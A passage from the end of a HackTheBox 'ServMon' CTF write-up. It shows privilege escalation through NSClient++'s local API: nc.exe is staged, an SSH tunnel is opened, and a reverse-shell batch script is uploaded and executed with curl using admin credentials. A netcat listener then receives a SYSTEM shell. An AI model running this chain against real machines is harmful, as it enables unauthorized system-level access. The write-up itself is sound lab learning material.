+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Program Files\NSClient++&gt; ls C:\Temp</span><br><span class="line"></span><br><span class="line">    Directory: C:\Temp</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"><span class="literal">-a</span>----       <span class="number">26</span>/<span class="number">05</span>/<span class="number">2020</span>     <span class="number">13</span>:<span class="number">46</span>          <span class="number">38616</span> nc.exe</span><br></pre></td></tr></table></figure>
+
+<p>Alright, we have everything ready now. Let’s use <code>NSClient++</code> to execute our reverse shell with elevated privileges. To do so we need to add an “External Script” and then tell <code>NSClient++</code> to execute it. </p>
+<p>Since the Web Interface is not accessible we need to use the API. Thankfully it’s <em>almost</em> fully <a href="https://docs.nsclient.org/api/rest/" target="_blank" rel="noopener">documented</a>.</p>
+<p>The API is only accessible from <code>localhost</code> so I will open a SSH tunnel to make testing easier since I am more confortable working with <code>bash</code> than <code>powershell</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -L 4444:127.0.0.1:8443 nadine@10.10.10.184</span><br></pre></td></tr></table></figure>
+
+<p>Now we are all setup. Let’s add our external script (the reverse shell) using the API:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -k -u admin:ew2x6SsGTxjRwXOT -X PUT https://localhost:4444/api/v1/scripts/ext/scripts/hg8.bat --data-binary @hg8.bat</span><br><span class="line">Added hg8 as scripts\hg8.bat%</span><br></pre></td></tr></table></figure>
+
+<p>We can verify our script have been added:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -k -u admin:ew2x6SsGTxjRwXOT https://localhost:4444/api/v1/scripts/ext</span><br><span class="line">[<span class="string">"hg8"</span>]</span><br></pre></td></tr></table></figure>
+
+<p>Time to open our listener:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>
+
+<p>And use the API again to execute our script. The execute command was not so straightforward to find from the documentation but digging a little we can find it under <a href="https://docs.nsclient.org/api/rest/queries/#command-execute" target="_blank" rel="noopener"><code>queries</code> endpoint</a>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -k -u admin:ew2x6SsGTxjRwXOT <span class="string">"https://127.0.0.1:4444/api/v1/queries/hg8/commands/execute"</span></span><br></pre></td></tr></table></figure>
+
+<p>And on our listener a new connection open, we have a shell as <code>nt authority\system</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.184:49746</span><br><span class="line">Microsoft Windows [Version 10.0.18363.752]</span><br><span class="line">(c) 2019 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Program Files\NSClient++&gt; whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Program Files\NSClient++&gt; <span class="built_in">type</span> C:\Users\Administrator\Desktop\root.txt</span><br><span class="line">0xxxxxxxxxxxxxxxxxxxxx5</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Easy-Box/">Easy Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/NSPClient/" rel="tag">NSPClient</a>, <a class="tag-link" href="/tags/ServMon/" rel="tag">ServMon</a>, <a class="tag-link" href="/tags/crackmapexec/" rel="tag">crackmapexec</a>, <a class="tag-link" href="/tags/directory-traversal/" rel="tag">directory traversal</a>, <a class="tag-link" href="/tags/ftp/" rel="tag">ftp</a>, <a class="tag-link" href="/tags/hydra/" rel="tag">hydra</a>, <a class="tag-link" href="/tags/ssh-tunnel/" rel="tag">ssh tunnel</a>, <a class="tag-link" href="/tags/windows/" rel="tag">windows</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-anonymous-login"><span class="toc-number">1.2.</span> <span class="toc-text">FTP anonymous login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TVT-NVMS-1000-Directory-Traversal"><span class="toc-number">1.3.</span> <span class="toc-text">TVT NVMS 1000 - Directory Traversal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nadine-account-bruteforce"><span class="toc-number">1.4.</span> <span class="toc-text">Nadine account bruteforce</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-brute-force"><span class="toc-number">1.4.1.</span> <span class="toc-text">SSH brute force</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SMB-bruteforce"><span class="toc-number">1.4.2.</span> <span class="toc-text">SMB bruteforce</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSPClient-Privilege-Escalation"><span class="toc-number">2.2.</span> <span class="toc-text">NSPClient++ Privilege Escalation</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
